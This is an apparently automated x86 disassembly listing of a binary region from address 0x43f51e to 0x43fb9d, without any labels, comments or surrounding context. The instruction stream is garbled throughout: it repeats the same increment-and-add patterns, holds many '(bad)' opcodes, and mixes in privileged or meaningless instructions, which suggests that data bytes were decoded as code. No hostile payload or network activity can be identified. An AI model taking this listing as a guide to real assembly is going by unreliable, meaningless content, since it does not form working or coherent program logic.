  43f51e:	inc    DWORD PTR [edx]
  43f520:	sbb    ch,BYTE PTR [esi-0x31c4f701]
  43f526:	call   DWORD PTR [edi-0x45]
  43f529:	iret   
  43f52a:	jmp    FWORD PTR [edi]
  43f52c:	jae    0x43f520
  43f52e:	inc    DWORD PTR [eax]
  43f530:	add    BYTE PTR [ecx+0x5d0000ff],dl
  43f536:	inc    DWORD PTR [eax]
  43f538:	add    BYTE PTR ds:0x1e0000ff,dh
  43f53e:	inc    DWORD PTR [eax]
  43f540:	add    BYTE PTR [ecx],dl
  43f542:	inc    DWORD PTR [eax]
  43f544:	add    BYTE PTR [esi],cl
  43f546:	inc    DWORD PTR [eax]
  43f548:	add    BYTE PTR [edi+edi*8],cl
  43f54b:	add    BYTE PTR [eax],al
  43f54d:	pop    ss
  43f54e:	inc    DWORD PTR [eax]
  43f550:	add    BYTE PTR [eax],ah
  43f552:	inc    DWORD PTR [eax]
  43f554:	add    BYTE PTR [ebp-0x1],al
  43f557:	add    BYTE PTR [eax],al
  43f559:	push   0xa10301ff
  43f55e:	call   FWORD PTR [ebx]
  43f560:	xor    DWORD PTR [edx-0x3477bd01],ebp
  43f566:	jmp    DWORD PTR [ebx]
  43f568:	imul   esi,esi,0xffffffff
  43f56b:	sbb    DWORD PTR [eax+edx*8-0x1],ecx
  43f56f:	and    BYTE PTR [ecx],dh
  43f571:	mov    edi,?
  43f573:	and    al,0x5a
  43f575:	sar    edi,1
  43f577:	xor    DWORD PTR [esi-0x51],ecx
  43f57a:	(bad)  
  43f57b:	cmp    eax,0x53ffe6a1
  43f580:	mov    edi,0x3d28ffff
  43f585:	xchg   ebp,eax
  43f586:	jmp    FWORD PTR [ebx]
  43f588:	inc    ecx
  43f589:	xchg   esi,eax
  43f58a:	jmp    FWORD PTR [edx]
  43f58c:	popa   
  43f58d:	leave  
  43f58e:	inc    DWORD PTR [eax]
  43f590:	and    eax,0x3f26ffa8
  43f595:	jae    0x43f596
  43f597:	cmp    dl,ah
  43f599:	(bad)  
  43f59a:	inc    DWORD PTR [eax]
  43f59c:	pop    ds
  43f59d:	std    
  43f59e:	inc    DWORD PTR [eax]
  43f5a0:	add    ah,al
  43f5a2:	inc    DWORD PTR [eax]
  43f5a4:	add    BYTE PTR [edi+edi*8+0x0],bh
  43f5a8:	add    BYTE PTR [edi+edi*8+0x0],dl
  43f5ac:	add    BYTE PTR [edi],dh
  43f5ae:	inc    DWORD PTR [eax]
  43f5b0:	add    BYTE PTR [edi],ch
  43f5b2:	inc    DWORD PTR [eax]
  43f5b4:	add    BYTE PTR [eax],ch
  43f5b6:	inc    DWORD PTR [eax]
  43f5b8:	add    BYTE PTR [esi],bl
  43f5ba:	inc    DWORD PTR [eax]
  43f5bc:	add    BYTE PTR [esi],ah
  43f5be:	inc    DWORD PTR [eax]
  43f5c0:	add    BYTE PTR ds:0x1f0000ff,bl
  43f5c6:	inc    DWORD PTR [eax]
  43f5c8:	add    BYTE PTR [edx],bl
  43f5ca:	inc    DWORD PTR [eax]
  43f5cc:	add    BYTE PTR [edx],ah
  43f5ce:	inc    DWORD PTR [eax]
  43f5d0:	add    BYTE PTR [edi],bl
  43f5d2:	inc    DWORD PTR [eax]
  43f5d4:	add    BYTE PTR [ecx],bl
  43f5d6:	inc    DWORD PTR [eax]
  43f5d8:	add    BYTE PTR [edi+edi*8],bl
  43f5db:	add    BYTE PTR [eax],al
  43f5dd:	and    eax,0x2f0000ff
  43f5e2:	inc    DWORD PTR [eax]
  43f5e4:	add    BYTE PTR [ecx],bh
  43f5e6:	inc    DWORD PTR [eax]
  43f5e8:	add    BYTE PTR [edx-0x1],bl
  43f5eb:	add    BYTE PTR [eax],al
  43f5ed:	cmp    bh,0x1
  43f5f0:	add    DWORD PTR [ebx-0x45f9f801],esp
  43f5f6:	push   DWORD PTR [edi]
  43f5f8:	mov    fs,eax
  43f5fa:	jmp    DWORD PTR [edi-0x1]
  43f5fd:	(bad)  
  43f5fe:	call   FWORD PTR ds:0xaffa341
  43f604:	or     DWORD PTR [esi-0x1],ebx
  43f607:	adc    ah,BYTE PTR [ecx]
  43f609:	call   WORD PTR [eax+esi*1]
  43f60d:	sahf   
  43f60e:	call   FWORD PTR [edx]
  43f610:	inc    edi
  43f611:	mov    ah,0xff
  43f613:	sbb    al,0x2b
  43f615:	ins    BYTE PTR es:[edi],dx
  43f616:	call   FWORD PTR [edx]
  43f618:	inc    edi
  43f619:	mov    edi,0xee5018ff
  43f61e:	inc    DWORD PTR [esi+eax*1]
  43f621:	ret    
  43f622:	inc    DWORD PTR [eax]
  43f624:	add    BYTE PTR [esi+0x730000ff],dl
  43f62a:	inc    DWORD PTR [eax]
  43f62c:	add    BYTE PTR [edx-0x1],dl
  43f62f:	add    BYTE PTR [eax],al
  43f631:	inc    ebp
  43f632:	inc    DWORD PTR [eax]
  43f634:	add    BYTE PTR [esi],dh
  43f636:	inc    DWORD PTR [eax]
  43f638:	add    BYTE PTR [ebx],ch
  43f63a:	inc    DWORD PTR [eax]
  43f63c:	add    BYTE PTR [ecx],ch
  43f63e:	inc    DWORD PTR [eax]
  43f640:	add    BYTE PTR [esi],bl
  43f642:	inc    DWORD PTR [eax]
  43f644:	add    BYTE PTR [edi+edi*8],ah
  43f647:	add    BYTE PTR [eax],al
  43f649:	pop    ss
  43f64a:	inc    DWORD PTR [eax]
  43f64c:	add    BYTE PTR [edi],ah
  43f64e:	inc    DWORD PTR [eax]
  43f650:	add    BYTE PTR ds:0x2f0000ff,bl
  43f656:	inc    DWORD PTR [eax]
  43f658:	add    BYTE PTR [esi],ah
  43f65a:	inc    DWORD PTR [eax]
  43f65c:	add    BYTE PTR [esi],ah
  43f65e:	inc    DWORD PTR [eax]
  43f660:	add    BYTE PTR [edi],bl
  43f662:	inc    DWORD PTR [eax]
  43f664:	add    BYTE PTR [eax],ah
  43f666:	inc    DWORD PTR [eax]
  43f668:	add    BYTE PTR [edi+edi*8],ch
  43f66b:	add    BYTE PTR [eax],al
  43f66d:	xor    edi,edi
  43f66f:	add    BYTE PTR [eax],al
  43f671:	push   edx
  43f672:	inc    DWORD PTR [eax]
  43f674:	add    BYTE PTR [edi-0x1],bh
  43f677:	add    BYTE PTR [edx],cl
  43f679:	fdivp  st(7),st
  43f67b:	add    BYTE PTR [edi],dl
  43f67d:	mov    eax,ds:0x5b230aff
  43f682:	inc    DWORD PTR [eax]
  43f684:	add    BYTE PTR [edi+edi*8+0x13],ch
  43f688:	and    al,0x4b
  43f68a:	jmp    FWORD PTR [ecx]
  43f68c:	inc    ecx
  43f68d:	mov    edi,edi
  43f68f:	or     al,0x15
  43f691:	dec    esi
  43f692:	inc    DWORD PTR [eax]
  43f694:	or     DWORD PTR [ecx-0x1],eax
  43f697:	pop    ss
  43f698:	sub    bh,BYTE PTR [edx-0x1]
  43f69b:	das    
  43f69c:	popa   
  43f69d:	sar    edi,1
  43f69f:	es inc ebx
  43f6a1:	lahf   
  43f6a2:	call   FWORD PTR [ecx+esi*1]
  43f6a5:	jnp    0x43f6a6
  43f6a7:	daa    
  43f6a8:	pop    eax
  43f6a9:	mov    al,ds:0xdf320fff
  43f6ae:	inc    DWORD PTR [edx+edx*1]
  43f6b1:	sti    
  43f6b2:	inc    DWORD PTR [ecx]
  43f6b4:	add    bl,BYTE PTR [ebp+0x6c0000ff]
  43f6ba:	inc    DWORD PTR [eax]
  43f6bc:	add    BYTE PTR [ebx-0x1],al
  43f6bf:	add    BYTE PTR [eax],al
  43f6c1:	xor    al,0xff
  43f6c3:	add    BYTE PTR [eax],al
  43f6c5:	daa    
  43f6c6:	inc    DWORD PTR [eax]
  43f6c8:	add    BYTE PTR ds:0x210000ff,ah
  43f6ce:	inc    DWORD PTR [eax]
  43f6d0:	add    BYTE PTR ds:0x1b0000ff,dl
  43f6d6:	inc    DWORD PTR [eax]
  43f6d8:	add    BYTE PTR [edx],bl
  43f6da:	inc    DWORD PTR [eax]
  43f6dc:	add    BYTE PTR [ebx],bl
  43f6de:	inc    DWORD PTR [eax]
  43f6e0:	add    BYTE PTR [edx],ah
  43f6e2:	inc    DWORD PTR [eax]
  43f6e4:	add    BYTE PTR [edx],dh
  43f6e6:	inc    DWORD PTR [eax]
  43f6e8:	add    BYTE PTR [edx-0x1],dl
  43f6eb:	add    BYTE PTR [eax],al
  43f6ed:	jg     0x43f6ee
  43f6ef:	push   es
  43f6f0:	sbb    al,0xbc
  43f6f2:	jmp    FWORD PTR [ecx]
  43f6f4:	jl     0x43f6f2
  43f6f6:	jmp    FWORD PTR [esi]
  43f6f8:	mov    cl,bl
  43f6fa:	call   DWORD PTR [ecx]
  43f6fc:	xor    al,0xcb
  43f6fe:	call   DWORD PTR [ecx]
  43f700:	sub    al,0xac
  43f702:	call   DWORD PTR [eax]
  43f704:	sub    BYTE PTR [eax-0x66d6ef01],dl
  43f70a:	call   DWORD PTR [ebx]
  43f70c:	sub    DWORD PTR [ebp-0x78e2f301],ecx
  43f712:	dec    DWORD PTR [eax]
  43f714:	sbb    ch,BYTE PTR [ebx-0x1]
  43f717:	or     al,0x1d
  43f719:	jle    0x43f71a
  43f71b:	or     ebx,DWORD PTR [esi]
  43f71d:	xchg   ebx,eax
  43f71e:	inc    DWORD PTR [ebx]
  43f720:	sbb    eax,0x2c04ffac
  43f725:	sar    bh,1
  43f727:	inc    esi
  43f728:	test   al,0xd2
  43f72a:	dec    DWORD PTR [esi-0x53]
  43f72d:	sti    
  43f72e:	inc    DWORD PTR [ecx]
  43f730:	add    ah,BYTE PTR [ecx+0x670000ff]
  43f736:	inc    DWORD PTR [eax]
  43f738:	add    BYTE PTR ds:0x210000ff,bh
  43f73e:	inc    DWORD PTR [eax]
  43f740:	add    BYTE PTR ds:0xc0000ff,dl
  43f746:	inc    DWORD PTR [eax]
  43f748:	add    BYTE PTR [esi],dl
  43f74a:	inc    DWORD PTR [eax]
  43f74c:	add    BYTE PTR ds:0x1f0000ff,dl
  43f752:	inc    DWORD PTR [eax]
  43f754:	add    BYTE PTR [ebx],bh
  43f756:	inc    DWORD PTR [eax]
  43f758:	add    BYTE PTR [ebp-0x1],ah
  43f75b:	add    al,BYTE PTR [ebx]
  43f75d:	popf   
  43f75e:	jmp    DWORD PTR [eax]
  43f760:	ds test eax,0xd0451eff
  43f766:	jmp    DWORD PTR [ecx]
  43f768:	dec    esp
  43f769:	jmp    0xc6a2236d
  43f76e:	jmp    DWORD PTR [eax]
  43f770:	ds mov ecx,0xe59237ff
  43f776:	(bad)  
  43f777:	cmp    ecx,DWORD PTR [ebx+0x4431ffd9]
  43f77d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f77e:	inc    DWORD PTR [eax-0x5f]
  43f781:	in     eax,0xff
  43f783:	cmp    eax,0x27ffec90
  43f788:	cmp    eax,0x4f2aff90
  43f78d:	mov    eax,0xb73511ff
  43f792:	jmp    DWORD PTR [edx]
  43f794:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  43f796:	(bad)  
  43f797:	cmp    al,0x98
  43f799:	xlat   BYTE PTR ds:[ebx]
  43f79a:	inc    DWORD PTR [esi+edx*1]
  43f79d:	loopne 0x43f79e
  43f79f:	add    BYTE PTR [eax],al
  43f7a1:	mov    dh,0xff
  43f7a3:	add    BYTE PTR [eax],al
  43f7a5:	jne    0x43f7a6
  43f7a7:	add    BYTE PTR [eax],al
  43f7a9:	dec    eax
  43f7aa:	inc    DWORD PTR [eax]
  43f7ac:	add    BYTE PTR ds:0x240000ff,ah
  43f7b2:	inc    DWORD PTR [eax]
  43f7b4:	add    BYTE PTR [ebx],bl
  43f7b6:	inc    DWORD PTR [eax]
  43f7b8:	add    BYTE PTR [ecx],bl
  43f7ba:	inc    DWORD PTR [eax]
  43f7bc:	add    BYTE PTR [edi],bl
  43f7be:	inc    DWORD PTR [eax]
  43f7c0:	add    BYTE PTR [edi+edi*8],bl
  43f7c3:	add    BYTE PTR [eax],al
  43f7c5:	adc    eax,0x180000ff
  43f7ca:	inc    DWORD PTR [eax]
  43f7cc:	add    BYTE PTR [edi+edi*8],bl
  43f7cf:	add    BYTE PTR [eax],al
  43f7d1:	sbb    bh,bh
  43f7d3:	add    BYTE PTR [eax],al
  43f7d5:	pop    ds
  43f7d6:	inc    DWORD PTR [eax]
  43f7d8:	add    BYTE PTR ds:0x230000ff,bl
  43f7de:	inc    DWORD PTR [eax]
  43f7e0:	add    BYTE PTR [edi],ch
  43f7e2:	inc    DWORD PTR [eax]
  43f7e4:	add    BYTE PTR [edx-0x1],al
  43f7e7:	add    BYTE PTR [eax],al
  43f7e9:	inc    DWORD PTR gs:[eax]
  43f7ec:	add    BYTE PTR [eax-0x41d8ed01],dl
  43f7f2:	jmp    DWORD PTR [edx]
  43f7f4:	ja     0x43f7e7
  43f7f6:	jmp    DWORD PTR ds:0x19ffffa0
  43f7fc:	sub    eax,0x2422ff8d
  43f801:	cmp    edi,0x19
  43f804:	sub    eax,0x2312ff93
  43f809:	ins    BYTE PTR es:[edi],dx
  43f80a:	call   DWORD PTR [edx+eiz*1]
  43f80d:	outs   dx,BYTE PTR ds:[esi]
  43f80e:	call   FWORD PTR [eax]
  43f810:	aas    
  43f811:	mov    bh,0xff
  43f813:	sbb    BYTE PTR ds:0x2815ff8e,dh
  43f819:	je     0x43f81a
  43f81b:	and    bh,BYTE PTR [esi+ebp*8-0x1]
  43f81f:	or     bl,BYTE PTR ds:0xfff7
  43f825:	mov    bh,0xff
  43f827:	add    BYTE PTR [eax],al
  43f829:	jg     0x43f82a
  43f82b:	add    BYTE PTR [eax],al
  43f82d:	pop    ebx
  43f82e:	inc    DWORD PTR [eax]
  43f830:	add    BYTE PTR [edx],bh
  43f832:	inc    DWORD PTR [eax]
  43f834:	add    BYTE PTR [edi],ah
  43f836:	inc    DWORD PTR [eax]
  43f838:	add    BYTE PTR [ecx],ch
  43f83a:	inc    DWORD PTR [eax]
  43f83c:	add    BYTE PTR [ebx],dh
  43f83e:	inc    DWORD PTR [eax]
  43f840:	add    BYTE PTR [esi],ch
  43f842:	inc    DWORD PTR [eax]
  43f844:	add    BYTE PTR [eax],dh
  43f846:	inc    DWORD PTR [eax]
  43f848:	add    BYTE PTR [ebx],ch
  43f84a:	inc    DWORD PTR [eax]
  43f84c:	add    BYTE PTR [ebx],ah
  43f84e:	inc    DWORD PTR [eax]
  43f850:	add    BYTE PTR [edx],ch
  43f852:	inc    DWORD PTR [eax]
  43f854:	add    BYTE PTR [ebx],ch
  43f856:	inc    DWORD PTR [eax]
  43f858:	add    BYTE PTR [eax],bl
  43f85a:	inc    DWORD PTR [eax]
  43f85c:	add    BYTE PTR [edx],bl
  43f85e:	inc    DWORD PTR [eax]
  43f860:	add    BYTE PTR [eax],ch
  43f862:	inc    DWORD PTR [eax]
  43f864:	add    BYTE PTR [edi+edi*8],bl
  43f867:	add    BYTE PTR [eax],al
  43f869:	sub    edi,edi
  43f86b:	add    BYTE PTR [eax],al
  43f86d:	sub    al,0xff
  43f86f:	add    BYTE PTR [eax],al
  43f871:	dec    esp
  43f872:	inc    DWORD PTR [eax]
  43f874:	add    BYTE PTR [ebp-0x1],dh
  43f877:	add    BYTE PTR [edx],cl
  43f879:	sar    edi,cl
  43f87b:	add    BYTE PTR [edi],dl
  43f87d:	fdivp  st(7),st
  43f87f:	or     BYTE PTR [ecx],ch
  43f881:	mov    edi,edi
  43f883:	adc    al,0x33
  43f885:	lahf   
  43f886:	call   FWORD PTR [ebp*1+0x3e22ff72]
  43f88d:	sahf   
  43f88e:	call   DWORD PTR [edi]
  43f890:	xor    DWORD PTR [edx+0x43120bff],edx
  43f896:	inc    DWORD PTR [ecx]
  43f898:	or     edi,DWORD PTR [edi+edi*8]
  43f89b:	and    esi,DWORD PTR ds:0x3b23ff85
  43f8a1:	mov    edi,edi
  43f8a3:	and    BYTE PTR [edi],dh
  43f8a5:	cmp    bh,0x23
  43f8a8:	dec    ecx
  43f8a9:	xchg   edi,eax
  43f8aa:	jmp    DWORD PTR [edx]
  43f8ac:	dec    esi
  43f8ad:	mov    ds:0xec1204ff,al
  43f8b2:	inc    DWORD PTR [ecx]
  43f8b4:	add    DWORD PTR [edi+0x6c0000ff],ebx
  43f8ba:	inc    DWORD PTR [eax]
  43f8bc:	add    BYTE PTR [esi-0x1],al
  43f8bf:	add    BYTE PTR [eax],al
  43f8c1:	sub    edi,edi
  43f8c3:	add    BYTE PTR [eax],al
  43f8c5:	sbb    edi,edi
  43f8c7:	add    BYTE PTR [eax],al
  43f8c9:	pop    ss
  43f8ca:	inc    DWORD PTR [eax]
  43f8cc:	add    BYTE PTR ds:0x220000ff,ah
  43f8d2:	inc    DWORD PTR [eax]
  43f8d4:	add    BYTE PTR [edx],ah
  43f8d6:	inc    DWORD PTR [eax]
  43f8d8:	add    BYTE PTR [edi],bl
  43f8da:	inc    DWORD PTR [eax]
  43f8dc:	add    BYTE PTR [ecx],ah
  43f8de:	inc    DWORD PTR [eax]
  43f8e0:	add    BYTE PTR [edi],ah
  43f8e2:	inc    DWORD PTR [eax]
  43f8e4:	add    BYTE PTR [eax],ch
  43f8e6:	inc    DWORD PTR [eax]
  43f8e8:	add    BYTE PTR [edi-0x1],al
  43f8eb:	add    BYTE PTR [eax],al
  43f8ed:	outs   dx,DWORD PTR ds:[esi]
  43f8ee:	inc    DWORD PTR [edx]
  43f8f0:	or     esp,DWORD PTR [ebp-0xea2e101]
  43f8f6:	dec    DWORD PTR [eax]
  43f8f8:	adc    BYTE PTR [edi-0x4cd1ef01],ch
  43f8fe:	call   DWORD PTR [eax]
  43f900:	sub    ecx,esi
  43f902:	call   DWORD PTR [esi]
  43f904:	aaa    
  43f905:	sar    bh,cl
  43f907:	or     al,0x22
  43f909:	cdq    
  43f90a:	dec    DWORD PTR [esi]
  43f90c:	sbb    eax,0x170aff6a
  43f911:	pop    ecx
  43f912:	dec    DWORD PTR [ebx]
  43f914:	adc    eax,0x1408ff61
  43f919:	push   esi
  43f91a:	call   DWORD PTR [eax+edi*1]
  43f91d:	mov    ch,0xff
  43f91f:	push   es
  43f920:	sub    DWORD PTR [ebp-0x30c3fa01],esp
  43f926:	(bad)  
  43f927:	cmp    BYTE PTR [ecx-0x33a30030],dl
  43f92d:	(bad)  
  43f92e:	inc    DWORD PTR [eax]
  43f930:	add    BYTE PTR [ecx+0x760000ff],dh
  43f936:	inc    DWORD PTR [eax]
  43f938:	add    BYTE PTR [esi],bh
  43f93a:	inc    DWORD PTR [eax]
  43f93c:	add    BYTE PTR [esi],ah
  43f93e:	inc    DWORD PTR [eax]
  43f940:	add    BYTE PTR [eax],bl
  43f942:	inc    DWORD PTR [eax]
  43f944:	add    BYTE PTR [edi+edi*8],cl
  43f947:	add    BYTE PTR [eax],al
  43f949:	or     eax,0x130000ff
  43f94e:	inc    DWORD PTR [eax]
  43f950:	add    BYTE PTR [ecx],ah
  43f952:	inc    DWORD PTR [eax]
  43f954:	add    BYTE PTR [edi],bh
  43f956:	inc    DWORD PTR [eax]
  43f958:	add    BYTE PTR [edi-0x1],ah
  43f95b:	add    DWORD PTR [edx],eax
  43f95d:	call   0x25ff:0xaa411dff
  43f964:	dec    ebx
  43f965:	mov    esp,0xc23218ff
  43f96a:	jmp    DWORD PTR [esp+eax*2]
  43f96d:	scas   eax,DWORD PTR es:[edi]
  43f96e:	jmp    DWORD PTR ds:0x12ffd74b
  43f974:	xor    eax,0x3317ff92
  43f979:	push   0xd07332ff
  43f97e:	call   FWORD PTR [eax]
  43f980:	ds (bad) 
  43f984:	jno    0x43f954
  43f986:	push   DWORD PTR [edx]
  43f988:	push   esi
  43f989:	mov    bh,0xff
  43f98b:	and    DWORD PTR [ecx],edi
  43f98d:	mov    al,ds:0x91270eff
  43f992:	dec    DWORD PTR [esp+edx*2]
  43f995:	mov    esi,0xe55e1fff
  43f99a:	dec    DWORD PTR [eax]
  43f99c:	sub    al,0xe8
  43f99e:	inc    DWORD PTR [eax]
  43f9a0:	add    BYTE PTR [ecx+0x6a0000ff],ah
  43f9a6:	inc    DWORD PTR [eax]
  43f9a8:	add    BYTE PTR [edi+edi*8+0x0],al
  43f9ac:	add    BYTE PTR [esi],ah
  43f9ae:	inc    DWORD PTR [eax]
  43f9b0:	add    BYTE PTR [edx],bl
  43f9b2:	inc    DWORD PTR [eax]
  43f9b4:	add    BYTE PTR [edx],bl
  43f9b6:	inc    DWORD PTR [eax]
  43f9b8:	add    BYTE PTR [edx],bl
  43f9ba:	inc    DWORD PTR [eax]
  43f9bc:	add    BYTE PTR [esi],dl
  43f9be:	inc    DWORD PTR [eax]
  43f9c0:	add    BYTE PTR [ecx],bl
  43f9c2:	inc    DWORD PTR [eax]
  43f9c4:	add    BYTE PTR [edi+edi*8],bl
  43f9c7:	add    BYTE PTR [eax],al
  43f9c9:	sbb    edi,edi
  43f9cb:	add    BYTE PTR [eax],al
  43f9cd:	sbb    bh,bh
  43f9cf:	add    BYTE PTR [eax],al
  43f9d1:	push   ss
  43f9d2:	inc    DWORD PTR [eax]
  43f9d4:	add    BYTE PTR [eax],ah
  43f9d6:	inc    DWORD PTR [eax]
  43f9d8:	add    BYTE PTR [eax],ah
  43f9da:	inc    DWORD PTR [eax]
  43f9dc:	add    BYTE PTR [esi],ah
  43f9de:	inc    DWORD PTR [eax]
  43f9e0:	add    BYTE PTR [edi],bh
  43f9e2:	inc    DWORD PTR [eax]
  43f9e4:	add    BYTE PTR [edi+edi*8+0x0],dl
  43f9e8:	add    BYTE PTR [edi-0x1],dh
  43f9eb:	add    al,0x6
  43f9ed:	ret    
  43f9ee:	(bad)  
  43f9ef:	cmp    BYTE PTR [edi-0x39d20036],cl
  43f9f5:	(bad)  
  43f9f6:	call   DWORD PTR [edx]
  43f9f8:	es mov al,0xff
  43f9fb:	sbb    BYTE PTR [eax],dl
  43f9fd:	inc    ebp
  43f9fe:	jmp    DWORD PTR [esi]
  43fa00:	sub    eax,0x4327ff6f
  43fa05:	mov    edi,0x932d15ff
  43fa0a:	dec    DWORD PTR [edi]
  43fa0c:	sbb    edx,DWORD PTR [ebp-0x1]
  43fa0f:	sbb    DWORD PTR [esi],ebp
  43fa11:	xchg   ecx,eax
  43fa12:	call   FWORD PTR [ecx]
  43fa14:	dec    ecx
  43fa15:	mov    ecx,0x842b15ff
  43fa1a:	jmp    DWORD PTR [ecx]
  43fa1c:	push   0xaa2cffd2
  43fa21:	(bad)  
  43fa22:	inc    DWORD PTR [esi]
  43fa24:	paddusb mm7,mm7
  43fa27:	add    BYTE PTR [ecx],al
  43fa29:	pushf  
  43fa2a:	inc    DWORD PTR [eax]
  43fa2c:	add    BYTE PTR [ecx-0x1],dh
  43fa2f:	add    BYTE PTR [eax],al
  43fa31:	dec    eax
  43fa32:	inc    DWORD PTR [eax]
  43fa34:	add    BYTE PTR [edi],ch
  43fa36:	inc    DWORD PTR [eax]
  43fa38:	add    BYTE PTR ds:0x260000ff,ah
  43fa3e:	inc    DWORD PTR [eax]
  43fa40:	add    BYTE PTR [esi],bl
  43fa42:	inc    DWORD PTR [eax]
  43fa44:	add    BYTE PTR [eax],ch
  43fa46:	inc    DWORD PTR [eax]
  43fa48:	add    BYTE PTR [ebx],dh
  43fa4a:	inc    DWORD PTR [eax]
  43fa4c:	add    BYTE PTR [edi],ah
  43fa4e:	inc    DWORD PTR [eax]
  43fa50:	add    BYTE PTR [edi+edi*8],ch
  43fa53:	add    BYTE PTR [eax],al
  43fa55:	inc    DWORD PTR ss:[eax]
  43fa58:	add    BYTE PTR [esi],dh
  43fa5a:	inc    DWORD PTR [eax]
  43fa5c:	add    BYTE PTR [edx],ch
  43fa5e:	inc    DWORD PTR [eax]
  43fa60:	add    BYTE PTR [edi+edi*8],ch
  43fa63:	add    BYTE PTR [eax],al
  43fa65:	pop    ss
  43fa66:	inc    DWORD PTR [eax]
  43fa68:	add    BYTE PTR [edx],ah
  43fa6a:	inc    DWORD PTR [eax]
  43fa6c:	add    BYTE PTR ds:0x480000ff,ch
  43fa72:	inc    DWORD PTR [eax]
  43fa74:	add    BYTE PTR [edi+edi*8+0x0],ah
  43fa78:	pop    es
  43fa79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fa7a:	inc    DWORD PTR [ecx]
  43fa7c:	adc    bl,bh
  43fa7e:	inc    DWORD PTR [eax]
  43fa80:	or     DWORD PTR [edx-0x1],edi
  43fa83:	add    DWORD PTR [eax+eax*4],ecx
  43fa86:	inc    DWORD PTR [esi]
  43fa88:	pop    ss
  43fa89:	dec    edi
  43fa8a:	dec    DWORD PTR [esi+ebx*1]
  43fa8d:	inc    edi
  43fa8e:	jmp    DWORD PTR [edi]
  43fa90:	dec    edx
  43fa91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fa92:	call   FWORD PTR [ebx]
  43fa94:	aaa    
  43fa95:	test   bh,bh
  43fa97:	push   cs
  43fa98:	adc    eax,0x1f1cff47
  43fa9d:	call   FWORD PTR [si]
  43faa0:	and    ah,BYTE PTR [edi-0x1]
  43faa3:	sbb    bl,BYTE PTR [edi]
  43faa5:	pop    edx
  43faa6:	jmp    DWORD PTR [edx]
  43faa8:	inc    esp
  43faa9:	nop
  43faaa:	jmp    DWORD PTR [esi]
  43faac:	bound  edi,QWORD PTR [edi+edi*8-0xaf500]
  43fab3:	add    BYTE PTR [eax],al
  43fab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fab6:	inc    DWORD PTR [eax]
  43fab8:	add    BYTE PTR [edx-0x1],ch
  43fabb:	add    BYTE PTR [eax],al
  43fabd:	inc    ebx
  43fabe:	inc    DWORD PTR [eax]
  43fac0:	add    BYTE PTR [ebx],ch
  43fac2:	inc    DWORD PTR [eax]
  43fac4:	add    BYTE PTR ds:0x180000ff,bl
  43faca:	inc    DWORD PTR [eax]
  43facc:	add    BYTE PTR [edi+edi*8],bl
  43facf:	add    BYTE PTR [eax],al
  43fad1:	sbb    al,0xff
  43fad3:	add    BYTE PTR [eax],al
  43fad5:	sbb    eax,0x170000ff
  43fada:	inc    DWORD PTR [eax]
  43fadc:	add    BYTE PTR [ebx],dl
  43fade:	inc    DWORD PTR [eax]
  43fae0:	add    BYTE PTR [edi+edi*8],bl
  43fae3:	add    BYTE PTR [eax],al
  43fae5:	sub    bh,bh
  43fae7:	add    BYTE PTR [eax],al
  43fae9:	inc    eax
  43faea:	inc    DWORD PTR [eax]
  43faec:	add    BYTE PTR [edi-0x1],ah
  43faef:	add    BYTE PTR [eax],al
  43faf1:	cwde   
  43faf2:	call   FWORD PTR [esi]
  43faf4:	ins    DWORD PTR es:[edi],dx
  43faf5:	out    0xff,eax
  43faf7:	adc    BYTE PTR [ebx],dl
  43faf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fafa:	dec    DWORD PTR [esi]
  43fafc:	push   ss
  43fafd:	push   edi
  43fafe:	dec    DWORD PTR [esi+ebx*1]
  43fb01:	cmp    bh,0x18
  43fb04:	inc    ebx
  43fb05:	sar    edi,1
  43fb07:	push   cs
  43fb08:	and    edx,DWORD PTR [ebx+0x711a0cff]
  43fb0e:	dec    DWORD PTR ds:0xcff7221
  43fb14:	adc    eax,0x160aff42
  43fb19:	dec    esp
  43fb1a:	dec    DWORD PTR [edi]
  43fb1c:	pop    ds
  43fb1d:	dec    WORD PTR [ecx+ecx*1]
  43fb21:	aas    
  43fb22:	inc    DWORD PTR [eax]
  43fb24:	adc    BYTE PTR [edi-0x1e9ae101],bl
  43fb2a:	jmp    FWORD PTR [ecx-0x1a]
  43fb2d:	(bad)  
  43fb2e:	dec    DWORD PTR [edx]
  43fb30:	sbb    ah,al
  43fb32:	inc    DWORD PTR [eax]
  43fb34:	add    BYTE PTR [esi-0x1],bh
  43fb37:	add    BYTE PTR [eax],al
  43fb39:	dec    edx
  43fb3a:	inc    DWORD PTR [eax]
  43fb3c:	add    BYTE PTR [esi],ch
  43fb3e:	inc    DWORD PTR [eax]
  43fb40:	add    BYTE PTR [ecx],bl
  43fb42:	inc    DWORD PTR [eax]
  43fb44:	add    BYTE PTR ds:0xa0000ff,cl
  43fb4a:	inc    DWORD PTR [eax]
  43fb4c:	add    BYTE PTR [ecx],cl
  43fb4e:	inc    DWORD PTR [eax]
  43fb50:	add    BYTE PTR ds:0x350000ff,dl
  43fb56:	inc    DWORD PTR [eax]
  43fb58:	add    BYTE PTR [edi+edi*8+0x0],bl
  43fb5c:	add    DWORD PTR [ecx-0x4bd8ed01],edx
  43fb62:	jmp    DWORD PTR [edi]
  43fb64:	dec    edi
  43fb65:	(bad)  
  43fb66:	call   FWORD PTR [ecx]
  43fb68:	xor    dh,al
  43fb6a:	call   DWORD PTR [esp+ebx*1]
  43fb6d:	lods   al,BYTE PTR ds:[esi]
  43fb6e:	call   FWORD PTR [esi]
  43fb70:	push   ecx
  43fb71:	sar    bh,1
  43fb73:	add    BYTE PTR [esi],ah
  43fb75:	sar    bh,cl
  43fb77:	add    DWORD PTR [ecx],eax
  43fb79:	dec    edi
  43fb7a:	call   FWORD PTR [eax]
  43fb7c:	xor    dh,BYTE PTR [edi+edi*8+0x2e]
  43fb80:	and    esi,0xcf5824ff
  43fb86:	jmp    DWORD PTR [edx]
  43fb88:	aaa    
  43fb89:	test   bh,bh
  43fb8b:	daa    
  43fb8c:	cmp    edi,DWORD PTR [ebx-0x1]
  43fb8f:	adc    al,0xf
  43fb91:	pop    eax
  43fb92:	dec    DWORD PTR [eax]
  43fb94:	inc    ebx
  43fb95:	(bad)  
  43fb96:	jmp    DWORD PTR [esi]
  43fb98:	addr16 (bad) 
  43fb9a:	inc    DWORD PTR [eax]
  43fb9c:	pop    es
  43fb9d:	out    0xff,eax
